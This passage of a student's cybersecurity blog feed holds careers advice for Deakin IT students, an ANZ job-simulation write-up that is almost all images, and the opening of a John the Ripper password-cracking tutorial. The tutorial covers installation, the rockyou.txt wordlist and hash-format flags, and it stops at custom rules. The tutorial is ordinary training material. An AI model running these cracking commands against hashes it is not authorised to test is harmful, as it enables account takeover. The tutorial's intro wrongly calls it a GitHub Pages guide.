<p>Consider joining industry communities such as the Australian Information Security Association (AISA), the Information Systems Audit and Control Association (ISACA), and Open Worldwide Application Security Project (OWASP), which are active all across Australia. I’ve learned how helpful it can be to reach out to these communities either via email or through social media for volunteering opportunities, where you can introduce yourself and show your enthusiasm for helping out. This gives you a front-row ticket to some of the greatest minds and networking opportunities, while also helping the community.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/careers2.png" alt="Deakin University Clubs" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<p>If you’re someone who thinks networking is a bit daunting, university clubs are a great place to meet like-minded students. These clubs will often host both educational and social events that can introduce you to the industry without diving in the deep end first. As a great appetiser, university clubs also help you build stronger ties to the local Deakin community and make some friends who share the same interests as you. With club memberships being super affordable (the price of a cup of coffee!), students can connect with others in a low-pressure environment.</p>
<p>Think beyond the classroom! I highly encourage all of my fellow students to create or contribute to projects within your specialisation. These projects show your initiative and assist in refining your skills and are a fantastic talking point with future employers. My personal preference is sharing projects on GitHub, as well as cross-sharing these projects to LinkedIn where they’re more likely to catch the attention of industry professionals and potential employers.</p>
<p>It’s important to keep your connections alive, as staying in touch is key to building impactful relationships. Some things I’ve found helpful include sending a follow-up message after industry events, asking to grab a coffee (either virtual or online!), and keeping connections updated on your learning journey. Relationships are built over time, so never underestimate the power of catching up and sharing stories. These small steps now can lead to exponential long-term relationships.</p>
<p>You don’t need to join a formal program to benefit from mentoring. Take note of professionals who are active in the industry and are often engaging in initiatives, and reach out to them. You may be surprised by how open IT professionals are to sharing knowledge. I always say to other students who come to me for advice that one conversation can truly change the trajectory of your journey, so always put yourself out there as a continuous learner.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/careers3.png" alt="Deakin Open Day" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<p>Say yes to all kinds of opportunities, even when you’re not sure! If you think you’re perhaps unqualified for a job or opportunity, just apply anyway! Whether you are wanting to apply for scholarships like the Deakin Scholarship for Excellence, or the Deakin International Scholarship, internships, or volunteer roles, just go for it! The experience and growth you will gain from these opportunities will be valuable ten-fold. It is true that you miss all the shots you don’t take. There are plenty of opportunities including volunteering with Deakin that will make you stand out, such as Open Days, career expos, or IT workshops and other School of IT initiatives. By applying for these roles and saying yes, you show your leadership, and you open the doors to working with both faculty and industry partners.</p>
<p>While gaining the technical know-how in your degree can seem like enough to land a job, there are many other things you should be doing to boost your chances of landing an internship or post-graduate position. As an IT student at Deakin University, you already have access to an amazing network, so make the most of it by connecting with staff and other students both in your units of study and outside, like in university club and other events. If you start small, and set goals for yourself by staying active in the IT industry, you will feel your confidence grow which will, in turn, lead to a more lasting impression on future employers.</p>
<p>Remember: your future in cyber security starts now, and your dream role is more accessible than you think.</p>]]></content:encoded>
            <category>Reflections</category>
        </item>
        <item>
            <title><![CDATA[ANZ Cyber Job Simulation Write Up]]></title>
            <link>https://paigehai.github.io/blog/anz-write-up</link>
            <guid>https://paigehai.github.io/blog/anz-write-up</guid>
            <pubDate>Wed, 25 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/anz-thumb.png" alt="ANZ Job Simulation Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>Completed a cybersecurity simulation with ANZ, identifying threats through packet capture investigation using open-source tools.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/01.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/02.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/03.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/04.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/05.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/06.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/07.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/08.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/09.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/10.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/11.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/12.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/13.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/14.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/15.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/16.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/17.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/18.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/19.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/20.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/21.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/22.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/23.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/24.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/25.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/26.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/27.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/28.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/29.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/30.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/31.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/32.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/33.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/34.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/35.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/36.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/37.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/38.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/39.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/40.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/41.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/42.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/43.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/44.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/45.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/46.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/47.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/48.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/49.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/50.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/51.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/52.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/53.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/54.png" alt="ANZ Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:600px;width:100%;height:auto;border-radius:0"></div>]]></content:encoded>
            <category>Job Simulation</category>
            <category>Write Up</category>
        </item>
        <item>
            <title><![CDATA[A Guide to John the Ripper]]></title>
            <link>https://paigehai.github.io/blog/jtr-guide</link>
            <guid>https://paigehai.github.io/blog/jtr-guide</guid>
            <pubDate>Sat, 21 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/john-thumb.png" alt="John the Ripper Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>A quick cheat sheet for those who are interested in putting their development skills to the test. This cheat sheet provides the preliminary steps in setting up and deploying a GitHub Pages portfolio that you can use to show off your work.</p>
<p>In this guide, we will explore one of the most popular password cracking tool called <strong>John the Ripper</strong>. The most popular version of the tool is called <strong>Jumbo John</strong> and it is compatible with many different operating systems including Unix, MacOS, Windows, DOS, BeOS, and OpenVMS.</p>
<p>This guide will provide you a good foundation in understanding how John the Ripper works.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="installing-john-the-ripper">Installing John the Ripper<a href="https://paigehai.github.io/blog/jtr-guide#installing-john-the-ripper" class="hash-link" aria-label="Direct link to Installing John the Ripper" title="Direct link to Installing John the Ripper" translate="no">​</a></h4>
<p>John the Ripper is available on many Linux distributions, but in this guide, we’ll install the Jumbo community-enhanced version on an Ubuntu system.
To begin, run the command:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo apt update</span><br></span></code></pre></div></div>
<p>Ensure you install all required dependencies using:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo apt install -y build-essential libssl-dev git zlib1g-dev yasm pkg-config</span><br></span></code></pre></div></div>
<p>Next, you will need to clone the Jumbo version of John the Ripper:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/openwall/john.git</span><br></span></code></pre></div></div>
<p>and then move into the <code>/src</code> directory.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd john/src</span><br></span></code></pre></div></div>
<p>Next, you will need to build John the Ripper Jumbo. The following command will configure and compile the tool.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./configure &amp;&amp; make -s clean &amp;&amp; make -sj$(nproc)</span><br></span></code></pre></div></div>
<p><em>Note</em>: <code>$(nproc)</code> has been used to speed up the build by using all CPU cores. If you would prefer, you can replace this with a number instead.</p>
<p>Once compiled, add John to your system PATH (based on your shell) so you can run it from anywhere.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo 'export PATH="$HOME/john/run:$PATH"' &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc</span><br></span></code></pre></div></div>
<p>Lastly, we are going to set up a wrapper script that allows John to run with the full path to tis ececutable, so it can find its home directory from anywhere you run the <code>john</code> command.</p>
<p>Run the following commands in your terminal:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir -p ~/.local/bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo '#!/bin/bash' &gt; ~/.local/bin/john</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo 'exec "$HOME/john/run/john" "$@"' &gt;&gt; ~/.local/bin/john</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod +x ~/.local/bin/john</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nano ~/.bashrc</span><br></span></code></pre></div></div>
<p>Once you have reopened your <code>~/.bash</code> file, the shell might point to <code>export PATH="$HOME/john/run:$PATH"</code> instead of the wrapper script. If this is the case, just change this to <code>export PATH="$HOME/.local/bin:$HOME/john/run:$PATH"</code>.</p>
<p>Now reload <code>~/.bash</code> using:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">source ~/.bashrc</span><br></span></code></pre></div></div>
<p>To verify your installation, run the command:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --help</span><br></span></code></pre></div></div>
<p>You should see John the Ripper's help output, which confirms it has been installed correctly.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blogjtr1.png" alt="John the Ripper" class="shadow--md" style="max-width:700px;width:100%;height:auto"></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="john-the-ripper-commands">John the Ripper Commands<a href="https://paigehai.github.io/blog/jtr-guide#john-the-ripper-commands" class="hash-link" aria-label="Direct link to John the Ripper Commands" title="Direct link to John the Ripper Commands" translate="no">​</a></h4>
<p>John the Ripper has quite basic syntax in terms of its commands, and I will aim to cover the specific options and modifiers.</p>
<ul>
<li class=""><code>john</code>: this invokes the John the ripper tool</li>
<li class=""><code>[options]</code>: where we specify the options we are wanting to use</li>
<li class=""><code>[file path]</code>: this is the file that contains the hash you are trying to crack, if the file is in the same directly, then just denote the file name.</li>
</ul>
<p>John the Ripper has features that are built-in to detect the type of hash given. From this, the tool is able to apply rules and formats to crack the hash!</p>
<p>For hashes that you are unable to identify, this can be a great option, however, it can be unreliable.</p>
<p>An example of this command:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john [options] [file path]</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="wordlists">Wordlists<a href="https://paigehai.github.io/blog/jtr-guide#wordlists" class="hash-link" aria-label="Direct link to Wordlists" title="Direct link to Wordlists" translate="no">​</a></h4>
<p>When cracking hashes, you will likely use wordlists to crack the hashes in your experiments. I will introduce the following options that will help us refine our final command.</p>
<ul>
<li class=""><code>--wordlist=</code>: defines the wordlist to be used to crack the hash</li>
<li class=""><code>[path to wordlist]</code>: the path to the wordlist</li>
</ul>
<p>Wordlists can help us reduce the time needed to crack a hash, as we are providing a curated list of likely passwords or phrases for John the Ripper to try directly. Rather than a brute-force attack, John the Ripper will cycle through the wordlist.</p>
<p>To use a wordlist, the command will often be as follows:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --wordlist=[path to wordlist] [path to file]</span><br></span></code></pre></div></div>
<p>A wordlist that is often used, is the <strong>rockyou.txt</strong> wordlist, which is a list that was derived from a breach of <strong>rockyou.com</strong>, where millions of user passwords were leaked. These passwords are now available as a wordlist, that you can download from GitHub.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/danielmiessler/SecLists.git</span><br></span></code></pre></div></div>
<p>Then navigate to the correct folder:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd SecLists/Passwords/Leaked-Databases/</span><br></span></code></pre></div></div>
<p>and extract the file:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xvzf rockyou.txt.tar.gz</span><br></span></code></pre></div></div>
<p><strong>Example Usage:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --wordlist=rockyou.txt hash.txt</span><br></span></code></pre></div></div>
<p><em>Note</em>: For easier access, you can move the extracted <code>rockyou.txt</code> file to a common wordlist directly like <code>usr/share/wordlists/</code>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo mv rockyou.txt /usr/share/wordlists/</span><br></span></code></pre></div></div>
<p>Then you can refer to it in your commands like so:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="format-specific-cracking">Format-Specific Cracking<a href="https://paigehai.github.io/blog/jtr-guide#format-specific-cracking" class="hash-link" aria-label="Direct link to Format-Specific Cracking" title="Direct link to Format-Specific Cracking" translate="no">​</a></h4>
<p>If available, you can give a specific format to John the Ripper to use to crack a password using the following syntax:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --format=[format] --wordlist=[path to wordlist] [path to file]</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>--format=</code>: the flag to tell John that you are providing a hash of a specific format</li>
<li class=""><code>[format]</code>: the format of the hash</li>
</ul>
<p><strong>Example Usage:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></span></code></pre></div></div>
<p>For a full list of the formats that John can utilise, run the command:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --list=formats</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="creating-custom-rules">Creating Custom Rules<a href="https://paigehai.github.io/blog/jtr-guide#creating-custom-rules" class="hash-link" aria-label="Direct link to Creating Custom Rules" title="Direct link to Creating Custom Rules" translate="no">​</a></h4>
<p>In John the Ripper, we are able to define rules that can be used to create passwords dynamically. This can extend the way that passwords are guessed. These rules are defined in the <code>john.conf</code> file.</p>
<p>Based on how John has been installed, the configuration file can be found in:</p>
<ul>
<li class=""><code>/home/&lt;user&gt;/john/run</code>: as per the installation guide above</li>
<li class=""><code>/etc/john/john.conf</code>: if installed via a package manager or built from source, or</li>
<li class=""><code>/opt/john</code></li>
</ul>
<p>Custom rules can be defined under a named section in the aforementioned configuration file. Here is a breakdown of how to define and use them in your investigations:</p>
<h5 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-name-your-rule">1: Name Your Rule<a href="https://paigehai.github.io/blog/jtr-guide#1-name-your-rule" class="hash-link" aria-label="Direct link to 1: Name Your Rule" title="Direct link to 1: Name Your Rule" translate="no">​</a></h5>
<p>Each rule will begin with a section header, like so:</p>
